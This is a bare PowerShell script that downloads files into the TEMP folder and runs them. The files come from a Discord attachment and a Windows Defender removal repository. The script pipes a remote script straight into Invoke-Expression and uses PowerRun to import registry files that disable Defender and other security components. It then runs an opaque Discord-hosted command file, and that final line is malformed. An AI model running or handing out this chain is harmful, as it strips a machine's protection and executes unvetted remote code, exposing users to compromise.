Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1361978916260282389/1390707961395023912/RemoveFiles.cmd?ex=68693d38&is=6867ebb8&hm=89a4108966b7b0c3a107851f17b7d3696f0906f3240b5b810bdf9eea7909c737&" -OutFile "$env:TEMP\RemoveFiles.cmd"
Invoke-WebRequest -Uri "https://github.com/ionuttbara/windows-defender-remover/raw/main/Remove_SecurityComp/Remove_SecurityComp.reg" -OutFile "$env:TEMP\Remove_SecurityComp.reg"
Invoke-WebRequest -Uri "https://github.com/ionuttbara/windows-defender-remover/raw/main/Remove_Defender/RemoveDefender.reg" -OutFile "$env:TEMP\RemoveDefender.reg"
Invoke-WebRequest -Uri "https://github.com/ionuttbara/windows-defender-remover/raw/main/PowerRun.exe" -OutFile "$env:TEMP\PowerRun.exe"
Invoke-WebRequest -Uri "https://github.com/ionuttbara/windows-defender-remover/raw/main/PowerRun.ini" -OutFile "$env:TEMP\PowerRun.ini"
irm raw.githubusercontent.com/ionuttbara/windows-defender-remover/main/RemoveSecHealthApp.ps1 | iex
& "$env:TEMP\PowerRun.exe" reg.exe import "$env:TEMP\Remove_SecurityComp.reg"
& "$env:TEMP\PowerRun.exe" reg.exe import "$env:TEMP\RemoveDefender.reg"
& "$env:TEMP\RemoveFiles.cmd" reg.exe import "$env:TEMP\RemoveFiles.cmd"
